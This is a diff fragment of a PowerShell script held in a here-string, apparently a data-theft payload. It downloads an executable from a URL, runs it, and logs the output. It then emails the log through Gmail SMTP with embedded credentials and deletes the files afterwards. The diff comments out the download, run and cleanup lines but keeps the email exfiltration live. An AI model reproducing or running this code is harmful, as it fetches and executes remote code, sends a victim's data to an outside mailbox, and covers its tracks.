@@ -38,23 +38,24 @@ $MyScript2 = @'
 	$body='dnn'
 
 
-	(new-object System.Net.WebClient).DownloadFile($downloadURL, $exeFile);
-	$exeFile $arguments > $logFile
+##	(new-object System.Net.WebClient).DownloadFile($downloadURL, $exeFile);
+##	$exeFile $arguments > $logFile
 
-	del $exeFile
+#	del $exeFile
 
 	$SMTPServer = 'smtp.gmail.com';
 	$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587);
 	$SMTPInfo.EnableSsl = $true;
 	$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential($email, $password);
 	$ReportEmail = New-Object System.Net.Mail.MailMessage;
-	$ReportEmail.From = '%email%';$ReportEmail.To.Add('%email%');
+	$ReportEmail.From = $email;
+	$ReportEmail.To.Add($email);
 	$ReportEmail.Subject = $subject;
 	$ReportEmail.Body = $body;
 	$ReportEmail.Attachments.Add($logFile);
 	$SMTPInfo.Send($ReportEmail);
 
-	del $logFile
+#	del $logFile
 '@
 
 
